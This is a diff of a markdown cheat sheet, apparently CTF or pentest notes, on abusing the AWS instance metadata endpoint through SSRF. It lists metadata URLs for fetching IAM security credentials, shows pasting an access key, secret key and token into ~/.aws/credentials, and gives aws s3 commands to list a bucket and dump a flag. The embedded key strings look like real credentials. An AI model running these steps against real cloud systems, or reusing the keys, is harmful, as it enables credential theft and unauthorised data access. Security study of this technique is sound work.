@@ -280,21 +280,25 @@ http://169.254.169.254/latest/meta-data/iam/info   // Find an IAM role with acce
 http://169.254.169.254/latest/user-data
 ```
 2. Find AWS Access Keys.
-  * `http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]`
-  * Info retrieved should contain:
-    * AccessKeyId: { access key ID {
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+
+Info retrieved should contain:
+    * AccessKeyId: { access key ID }
     * SecretAccessKey: { secret access key }
     * Token { session token }
     * Expiration { expiry information }
+```
 4. Go to `~/.aws/credentials` and add in:
-  ```
-  aws_access_key_id = ASIAJMCBEBJIIGUWFBMA
-  aws_secret_access_key = sU0fWBEQj2G0pWLz5phfA5qTD7Q3wg19FpAtVC4f
-  aws_session_token = {really long access token string}
-  ```
-3. Enumerate s3 bucket content.
-  * `aws s3 ls s3://ns.agency`
-4. Dump a flag or file content to stdout or download it
+```
+aws_access_key_id = ASIAJMCBEBJIIGUWFBMA
+aws_secret_access_key = sU0fWBEQj2G0pWLz5phfA5qTD7Q3wg19FpAtVC4f
+aws_session_token = {really long access token string}
+```
+
+5. Enumerate s3 bucket content: `aws s3 ls s3://ns.agency`  
+
+6. Dump a flag or file content to stdout or download it
 ```
 aws s3 cp s3://ns.agency/flag -    // dump to stdout
 aws s3 cp s3://ns.agency/flag .    // download to current working dir
